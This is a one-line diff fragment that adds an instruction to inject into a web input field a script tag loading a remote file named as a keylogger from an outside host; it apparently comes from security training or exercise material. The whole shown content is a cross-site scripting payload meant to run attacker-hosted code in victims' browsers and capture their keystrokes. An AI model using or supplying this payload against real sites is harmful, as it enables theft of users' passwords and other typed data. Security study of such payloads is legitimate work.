@@ -1,0 +1,1 @@
+Inject into input field: <script src="http://ditectrev.idhosting.pl/05_keylogger.js">
